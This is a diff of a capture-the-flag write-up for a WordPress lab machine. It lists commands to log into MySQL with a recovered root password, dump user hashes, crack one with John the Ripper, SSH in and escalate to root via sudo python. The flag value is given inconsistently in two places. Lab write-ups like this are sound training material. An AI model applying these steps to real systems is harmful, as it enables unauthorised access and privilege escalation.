@@ -86,74 +86,64 @@ $ wpscan -u http://192.168.1.110/wordpress -eu
 - Capturing Flag 3: 
    * Gaining My SQL database access
    * Flag 3 was found in wp_posts table in the WordPress database
-  
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image15.png)  
 
+- Kali Linux Command: 
+   - $ mysql -u root -p
+   - Password: R@v3nSecurity  Host: 127.0.0.1
+   - Or $ mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1 
+   - show databases;
+   - use wordpress; 
+   - show tables;
+   - Select * from wp_users; 
 
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image4.png)
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image14.png)
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image21.png)
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image3.png)
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image12.png)
 
+- Flag 4: 715dea6c055b9fe3337544932f2941ce
 
+### Exploit used:
+   - Unsalted password hash and privilege escalation with Python
+   - Capturing flag 4: Secure user credentials from database, utilize John the Ripper to crack hash and use python to gain root privileges. 
+   - Utilizing the info from capturing flag 3. The Select * from wp_users command will reveal the username and password hashes for Michael and Steven utilizing MySQL.
+   - Copied the username and password hash for Steven. Saved the file and named it  hash.txt
+   ![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image13.png)
 
-Kali Linux Command: $ mysql -u root -p
-* Password: R@v3nSecurity  Host: 127.0.0.1
-* Or $ mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1 
-* show databases;
-* use wordpress; 
-* show tables;
-* Select * from wp_users; 
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-  
-
-  
-
-* Flag 4: 715dea6c055b9fe3337544932f2941ce
-* Exploit used:
-   * Unsalted password hash and privilege escalation with Python
-* Capturing flag 4: Secure user credentials from database, utilize John the Ripper to crack hash and use python to gain root privileges. 
-   * Utilizing the info from capturing flag 3. The Select * from wp_users command will reveal the username and password hashes for Michael and Steven utilizing MySQL.
-   * Copied the username and password hash for Steven. Saved the file and named it  hash.txt
-
-
-* Kali Linux Commands: 
+- Kali Linux Commands: 
    * mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1
    * show databases; 
    * use wordpress;
    * show tables; 
    * select * from wp_users;
-  
 
-  
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image3.png)
 
-* Utilized John the Ripper to crack the password hash from the hash.txt file.
-* Kali Linux command: 
+### Exploit Used: 
+- Utilized John the Ripper to crack the password hash from the hash.txt file.
+- Kali Linux command: 
    * $ john hash
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image19.png)
   
-
 * Steven Password cracked: pink84
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image6.png)
   
-
 * SSH using Steven’s credentials, Flag 4 was found.
 * ssh steven@192.168.1.110 
 * pw:pink84
 * sudo -l
 * sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image9.png)
   
-
 * Use python to gain root privileges
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image20.png)
   
-
 * cd root
 * ls
 * cat flag4.txt
-* Captured Flag4
+
+![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image18.png)
+
+### Captured Flag4: 715dea6c055b9fe33354932f2941ce
